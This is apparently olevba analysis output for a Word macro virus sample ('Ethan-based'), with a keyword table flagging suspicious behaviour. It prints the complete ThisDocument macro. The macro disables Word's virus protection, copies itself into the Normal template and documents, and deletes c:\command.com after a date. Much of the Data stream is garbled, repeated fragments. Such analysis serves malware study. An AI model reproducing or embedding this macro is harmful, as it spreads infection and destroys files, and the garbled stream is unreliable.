olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-cfee86470febdbd5d05cf26505a68011fb718878
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-cfee86470febdbd5d05cf26505a68011fb718878 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If Dir("c:\system.1", 6) = "" Then
Open "c:\system.1" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\system.1", 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\system.1" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Date > "25.12.99" Then Kill "c:\command.com"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

-------------------------------------------------------------------------------
VBA MACRO Data 
in file: Virus.MSWord.Ethan-based-cfee86470febdbd5d05cf26505a68011fb718878 - OLE stream: 'Data'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Macro to list the macro content of all the macros in the current
' template to a specified file
' Updated by SMT 19/09/1997 to cope with LARGE macros
' Updated by SMT 11/03/1999 to cope with ThisDocument Stream

Dim glMacrName$

Public Sub MAIN()
Dim virusfile$
Dim ie
 pae yST1/919 ocp ihLREmco
'Udtdb M 10/99t oewt hsouetSra

DmgMcNm$

ulcSbMI(
Dmvrsie
Dmi
peyT/1 c hRmo'dd  09tow sutröDgcm
ucbI
mri
m
eT1chm'd 9o urDc
cImime1h' ouD
Iieh u
ihuiuuAttribute VB_Name = "MacroList"

' Macro to list the macro cfe ie
 pae yST1/919 ocp ihLREmco
'Udtdb M 10/99t oewt hsöuetSra

DmgMcNm$

ulcSbMI(
Dmvrsie
Dmi
peyT/1 c hRmo'dd  09tow sutr
Dgcm
ucbI
mri
m
eT1chm'd 9o urDc
cImime1h' ouD
Iieh u
ihuiuuAtiueV_ae="arLs"

 ar ols h ar f e a S199opiLEc
UtbM1/9 ethöeSa
mMN$
lSM(DvseDipy/  Rod 0twst
gmub
rö
Tcmd9 rccmm1'oDIe 
hiutuVa=aL"
a l  rfeaS9oiE
tM/ töS
M$lMDsDp/ o ts
mbr
cd cm1oI huuaa"al fa9i
M ö
$Msp  smrc moöua"lf9
 
Mp mcmöal9 M cöl  ö ööAttribute VB_Name = "MacroList"

' Macro to list the macro content of all the maccp ihLREmco
'Udtdb M 10/99t oewt hsouetSra

DmgMcNö$

ulcSbMI(
Dmvrsie
Dmi
peyT/1 c hRmo'dd  09tow suör
Dgcm
ucbI
mri
m
eT1chm'd 9o urDc
cImime1h' ouD
Iieh u
ihuiuuAtiueV_ae="arLs"

 ar ols h ar f e a Sö99opiLEc
UtbM1/9 ethöeSa
mMN$
lSM(DvseDipy/  Rod 0öwst
gmub
r
Tcmd9 rccmm1'oDIe 
hiutuVa=aL"
a l  rfeaS9oiE
tM/ töS
M$lMDsDp/ o ts
mbr
cd cm1oI huuaa"öl fa9i
M ö
$Msp  smrc mo ua"lf9
 
Mp mcmöal9 M cölö ö ööAtiueV_ae="arLs"

 ar ols h ar otn faltemcpiLEc
UtbM1/9 ethoeSa
mMN$
lSM(DvseDipy/  Rod 0twsö
göub
r
Tcmd9 rccmm1'oDIe 
hiutuVa=aL"
a l  rfeaS9oiö
tM/ töS
M$lMDsDp/ o ös
mbr
cd cm1oI huuaa"al fa9i
M ö
$Msp  smrc mo ua"lf9
 
Mp mcm al9 M cöl  öööööie_e"rs
 rosha t atmpLcUb19eheamN
S(veiy Rd0wögu

öm9rcm'De
itV=L
  reSoöt/tSMlDD/oö
b
dc1Ihuaa aiMö$s sr ou"f

pmma9Mcl ööi_"s oh  tpcb9haNSvi dwg
ö9cöeiVL rSö/SlDo
cIuaaM$ ro"
pm9c ö_so tc9aSidgöceV ö/lo
IaM o
mcös caigcVöl
a 
cscicö
 ccc
ccccAttribute VB_Name = "MacroList"

' Macro to list the maöro content of all the maccp ihLREmöo
'Udtdb M 10/99t oewt hsouetSra

DmöMcNm$

ulcSbMI(
Dmörsie
Dmi
peyT/1 c hRmo'dd  09tow sutö
Dgcm
ucbI
mri
m
eö1chm'd 9o urDc
cImime1h' ouD
Iieh u
öhuiuuAtiueV_ae="arös"

 ar ols h ar f e a S199opiLEc
UtöM1/9 ethöeSa
mMN$
öSM(DvseDipy/  Rod 0twst
gmub
r
Tcmdö rccmm1'oDIe 
hiutöVa=aL"
a l  rfeaS9oiE
tM/ töS
M$lMDsöp/ o ts
mbr
cd cm1öI huuaa"al fa9i
M ö
$Msp  smrc mo uaölf9
 
Mp mcmöal9 Möcöl  ö ööAtiueV_ae="arLs"

 ar ols höar otn faltemcpiLEö
UtbM1/9 ethoeSa
mMN$
lSM(DvseDipy/ öRod 0twsö
gmub
r
öcmd9 rccmm1'oDIe 
hiutuVa=aL"
a l  röeaS9oiE
tM/ töS
M$öMDsDp/ o ös
mbr
cd cm1oI huuaa"al faöi
M ö
$Msp  smrc mö ua"lf9
 
Mp mcm al9 M cöl  ööööAie_ö"rs
 rosha t atmpLöUb19eheamN
S(veiy Rd0wögu

Tm9rcm'DeöitV=L
  reSoöt/tSMöDD/oö
b
dc1Ihuaa aiMö$s sr ou"f

pmmö9Mcl ööi_"s oh  tpöb9haNSvi dwg
ö9c'eiVL rSö/SlDo
cIuaöM$ ro"
pm9c ö_so tö9aSidgöceV S/lo
IaM o
mcös caigcVöl
ö 
cscicö
 ccc
ccccötiueV_ae="arLs"

 ar ols h ar otn faötemcpiLEö
UtbM1/9 öthoeSa
mMN$
lSM(DöseDipy/  Rod 0twstögmub
r
öcmd9 rccmö1'oDIe 
hiutuVa=aö"
a l  rfeaS9oiE
tö/ töS
M$öMDsDp/ o ös
mbr
cd cm1oI huöaa"al fa9i
M ö
$Msö  smrc mö ua"lf9
 öMp mcm al9 M cöl öö ööAie_e"rs
 roshö t atmpLöUb19eheamö
S(veiy Rd0wögu

öm9rcm'De
itV=L
  röSoEt/tSMöDD/oö
b
dö1Ihuaa aiMö$s sr öu"f

pmma9Mcl ööi_ös oh  tpöb9haNSvi öwg
T9c'eiVL rSö/SöDo
cIuaaM$ ro"
pmöc ö_so tö9aSidgöceö S/lo
IaM o
mcös öaigcVSl
a 
cscicö
öccc
ccccöie_e"rs
 öosha t atmpLöUb19öheamN
S(öeiy Rd0wtöu

öm9rcö'De
itV=öö  reSoEt/tSMöDD/oö
b
dc1Ihöaa aiMö$sösr öu"f
öpmma9Mclöööi_"s oh  tpöb9haöSvi dwg
ö9c'eiVL röE/SöDo
öIuaaM$ röö
pm9c ö_so tö9aSiögTceV S/öo
IaM o
möös öaigcöSl
a 
csööcS
 ccc
ccccöeer
ösatamLU1öem
(eyR0tö
mröD
t=ö eottMD/ööd1ha iöss ufömaMlöi" h pbhöv w
9'iLröSD
öua$röp9 _ot9Sööe /oIMomö agöla
söS c
cceröaaL1e
eRtörDtöetM/ö1ais fmMööhphvw9irS
u$ö9_tSö oMm gl
ö 
craLeetöteMöasfMöpv9r
$9töömg
 caettMafövr$tög atMfv$ö tf$ f  Aötribute VB_Name = öMacroList"

' Macro to list the maöro content of all öhe macros in the current
' templateöto a specified filö
' Updated by SMTl$
i e a S199opiLEö
UtbM1/9 ethoeSa
möN$
lSM(DvseDipy/  Rod 0twstögmub
r
öcmd9 rccmm1'oDIe 
öiutrbt BNm  Mcoit

'Mcot ittemcocei
öeyT/1 c hRmo'dd  0ötow sutr
Dgcm
ucbI
mri
m
eT1chm'd 9oöurDc
cImime1h' ouDöIieh u
ihuiuuAie_e"rs
 rosha    19pLöUb19eheamN
S(veiy öd0wtgu
öTm9rcm'De
itV=L
  reSoEt/tSMöDD/ot
b
dc1Ihuaa aöMö$s sr ou"f

pmma9Mcl  ötrbt BNm  Möoit

'Mcot ittemcoöneto l h ac hRmo'dd  09tow sutr
DgcööucbI
mri
m
eT1chm'ö 9o urDc
cImime1h' ouD
Iieh u
ihuiuuöie_e"rs
 rosha    ö9pLcUb19eheamN
S(veiy Rd0wtgu

Tm9rcö'De
itV=L
  reSoEtötSMlDD/ot
b
dc1Ihuaö aiMö$s sr ou"f
öpmma9Mcl  ötuVa=aLö
a l  ronfleciE
tM/ toS
M$lMDsDp/ o ös
öbr
cd cm1oI huuöa"al fa9i
M ö
$Msp  smrc mo ua"lf9
 öMp mcm al9 M c l  ö öööeer
rsatamLU1eem
(eyR0öu
mrmD
t=ö eottMD/öbd1ha iösö uf
maMlöi" h pbhNv w
9öiLröSD
cua$röp9 _ot9Sdöe /oIMomö agVla
siö c
cctrbt BNm  Mcoit

'Mcoö ittemöocneto l h öc hRmo'dd  09tow sutr
Döcm
ucbI
mri
ö
eT1chm'd 9o uöDc
öImime1h' ouD
Iieh u
ihuöuuAie_e"rs
 öosha    19pLcUö19eöeamN
S(veiy Rd0wtgu

Tmörcm'De
itV=Lö  reSoEt/tSMlDö/otöb
dc1Ihuaa aiMö$s sr ouöf

pmma9Mcl öötuVa=aL"
a l öronöleciE
tM/ toS
M$lMDsDp/öo ts
mbr
cd öm1oI huuaa"al öa9iöM ö
$Msp  smrc mo ua"lfö
 
Mp mcm alö M c l  ö ööAeör
röatamLU1eem
(eyR0öu
mrmDöt=
 eottMD/ööd1ha iöss uf
möMlöö" h pbhNv w
9'iLröSD
cuö$r"p9 _ot9Sdö
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

